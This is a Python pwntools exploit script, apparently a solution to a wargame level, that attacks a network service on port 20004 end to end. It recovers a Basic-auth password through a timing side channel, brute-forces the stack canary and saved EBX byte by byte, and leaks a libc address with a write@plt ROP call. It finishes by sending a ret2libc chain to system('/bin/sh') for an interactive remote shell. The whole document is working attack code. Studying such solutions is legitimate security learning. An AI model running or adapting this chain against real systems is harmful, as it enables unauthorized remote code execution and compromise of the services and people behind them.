#!/usr/bin/env python
from pwn import *
from base64 import b64encode
from string import ascii_letters, digits
from time import time

host = '192.168.1.102'

def check_char(password, c):
	credentials = b64encode('stack6:{}'.format(password + c))

	request  = ''
	request += 'GET / HTTP/1.0\n'
	request += 'Authorization: Basic {}\n'.format(credentials)

	context(log_level=logging.ERROR)

	r = remote(host, 20004)

	begin = time() * 10000
	r.sendline(request)
	res = r.recv()
	end = time() * 10000 - begin

	r.close()

	context(log_level=logging.INFO)
	return end, res

def bruteforcePassword():
	password = ''
	charset = ascii_letters + digits
	tmp = []

	for c in charset:
		end, res = check_char(password, c)
		tmp.append(end)

	lo = sorted(tmp)[0]
	password += charset[tmp.index(lo)]
	
	while len(password) < 16:
		for c in charset:
			end, res = check_char(password, c)
			if 'Ok' in res:
				return password + c
			if (end < lo):
				password += c

log.info('Starting timing attack')

password = bruteforcePassword()
log.success('Got password: ' + password)

def bruteforceCanary():
	canary = ''

	end = False
	canary_offset = 2000
	while not end:
		payload	 = ''
		payload += 'A' * canary_offset

		credentials = b64encode('stack6:{}{}'.format(password, payload))

		request  = ''
		request += 'GET / HTTP/1.0\n'
		request += 'Authorization: Basic {}\n'.format(credentials)

		context(log_level=logging.ERROR)

		r = remote(host, 20004)
		r.sendline(request)
		res = r.recv()
		r.close()

		context(log_level=logging.INFO)

		if 'smashing' in res:
			end = True
			canary_offset -= 1
		else:
			canary_offset += 1

	log.info('Canary offset: ' + str(canary_offset))

	context(log_level=logging.ERROR)

	for i in range(0, 4):
		for j in range(0, 256):
			payload	 = ''
			payload += 'A' * canary_offset
			payload += canary
			payload += chr(j)

			credentials = b64encode('stack6:{}{}'.format(password, payload))

			request  = ''
			request += 'GET / HTTP/1.0\n'
			request += 'Authorization: Basic {}\n'.format(credentials)

			r = remote(host, 20004)
			r.sendline(request)
			res = r.recv()
			r.close()

			if 'smashing' not in res:
				canary += chr(j)
				break

	context(log_level=logging.INFO)
	return canary, canary_offset

log.info('Bruteforcing canary')

canary, canary_offset = bruteforceCanary()
log.success('Got canary: ' + hex(u32(canary)))

def bruteforceEBX():
	ebx = ''

	context(log_level=logging.ERROR)

	for i in range(0, 4):
		for j in range(0, 256):
			payload	 = ''
			payload += 'A' * canary_offset
			payload += canary
			payload += 'A' * 12
			payload += ebx
			payload += chr(j)

			credentials = b64encode('stack6:{}{}'.format(password, payload))

			request  = ''
			request += 'GET / HTTP/1.0\n'
			request += 'Authorization: Basic {}\n'.format(credentials)

			try:
				r = remote(host, 20004)
				r.sendline(request)
				res = r.recv()
				r.close()

				if '200' in res:
					ebx += chr(j)
					break
			except:
				pass

	context(log_level=logging.INFO)
	return ebx

log.info('Bruteforcing EBX')

ebx = bruteforceEBX()
log.success('Got EBX: ' + hex(u32(ebx)))

base = u32(ebx) - 0x4118
log.info('Binary base: ' + hex(base))

def leakLibc():
	context(log_level=logging.ERROR)

	payload	 = ''
	payload += 'A' * canary_offset
	payload += canary
	payload += 'A' * 12
	payload += ebx
	payload += 'A' * 12
	payload += p32(base + 0xf30)  # write @ plt
	payload += p32(base + 0x17d4) # pop 3 ret
	payload += p32(0x1)
	payload += p32(base + 0x414c) # time @ got
	payload += p32(0x4)

	credentials = b64encode('stack6:{}{}'.format(password, payload))

	request  = ''
	request += 'GET / HTTP/1.0\n'
	request += 'Authorization: Basic {}\n'.format(credentials)

	r = remote(host, 20004)
	r.sendline(request)
	libc_leak = u32(r.recv(4))
	r.close()

	context(log_level=logging.INFO)
	return libc_leak

log.info('Leaking libc')
libc_leak = leakLibc()
log.success('Libc leak: ' + hex(libc_leak))

libc_base = libc_leak - 0x1a9d66
log.info('Libc base: ' + hex(libc_base))

payload	 = ''
payload += 'A' * canary_offset
payload += canary
payload += 'A' * 12
payload += ebx
payload += 'A' * 12
payload += p32(libc_base + 0x3cb20)  # system
payload += p32(libc_base + 0x329e0)  # exit
payload += p32(libc_base + 0x1388da) # /bin/sh

credentials = b64encode('stack6:{}{}'.format(password, payload))

request  = ''
request += 'GET / HTTP/1.0\n'
request += 'Authorization: Basic {}\n'.format(credentials)

r = remote(host, 20004)
log.info('Sending ROP chain')
r.sendline(request)
r.interactive()